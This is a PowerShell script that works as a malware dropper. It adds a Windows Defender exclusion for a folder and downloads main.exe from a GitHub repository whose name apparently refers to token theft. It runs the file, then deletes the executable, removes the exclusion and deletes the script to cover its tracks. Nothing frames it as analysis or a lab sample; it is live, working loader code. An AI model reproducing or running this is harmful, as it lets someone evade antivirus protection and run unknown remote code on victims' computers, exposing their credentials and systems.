$targetDirectory = "D:\Setups or somethin'"
$exeUrl = "https://github.com/AFRAID-FOR-YOU/What-a-token/raw/refs/heads/main/main.exe"
$exePath = "$targetDirectory\main.exe"
$selfPath = if ($MyInvocation.MyCommand.Path) { $MyInvocation.MyCommand.Path } else { $null }

# Check if Windows Defender is available
$defenderAvailable = $false
try {
    $defenderStatus = Get-MpComputerStatus -ErrorAction Stop
    if ($defenderStatus) {
        $defenderAvailable = $true
        Write-Host "Windows Defender is available"
    }
} catch {
    Write-Host "Windows Defender not available or accessible"
}

# Add Defender exclusion if available
if ($defenderAvailable) {
    try {
        Write-Host "Adding Windows Defender exclusion for $targetDirectory"
        Add-MpPreference -ExclusionPath $targetDirectory -ErrorAction Stop
        Write-Host "Exclusion added successfully"
    } catch {
        Write-Error "Failed to add Windows Defender exclusion: $_"
        exit 1
    }
}

# Ensure directory exists
if (-Not (Test-Path -Path $targetDirectory)) {
    Write-Host "Creating directory: $targetDirectory"
    try {
        New-Item -ItemType Directory -Path $targetDirectory -Force | Out-Null
    } catch {
        Write-Error "Failed to create directory: $_"
        # Remove exclusion if directory creation fails
        if ($defenderAvailable) {
            Remove-MpPreference -ExclusionPath $targetDirectory -ErrorAction SilentlyContinue
        }
        exit 1
    }
}

# Download the executable
try {
    Write-Host "Downloading executable from $exeUrl..."
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
    Write-Host "Downloaded successfully to $exePath"
} catch {
    Write-Error "Failed to download: $_"
    # Remove exclusion if download fails
    if ($defenderAvailable) {
        Remove-MpPreference -ExclusionPath $targetDirectory -ErrorAction SilentlyContinue
    }
    exit 1
}

# Run the executable
try {
    Write-Host "Running the downloaded executable..."
    Start-Process -FilePath $exePath -Wait -NoNewWindow
    Write-Host "Execution completed."
} catch {
    Write-Error "Error during execution: $_"
}

# Cleanup - delete the downloaded file, remove exclusion, and then this script (if running from file)
try {
    Write-Host "Cleaning up..."
    if (Test-Path $exePath) {
        Remove-Item -Path $exePath -Force
    }
    
    # Remove Defender exclusion if it was added
    if ($defenderAvailable) {
        try {
            Write-Host "Removing Windows Defender exclusion"
            Remove-MpPreference -ExclusionPath $targetDirectory -ErrorAction Stop
            Write-Host "Exclusion removed successfully"
        } catch {
            Write-Error "Failed to remove Windows Defender exclusion: $_"
        }
    }
    
    # Only try to delete if we have a path to this script
    if ($selfPath -and (Test-Path $selfPath)) {
        Start-Sleep -Seconds 1
        Remove-Item -Path $selfPath -Force
    }
    Write-Host "Cleanup done."
} catch {
    Write-Error "Cleanup failed: $_"
}
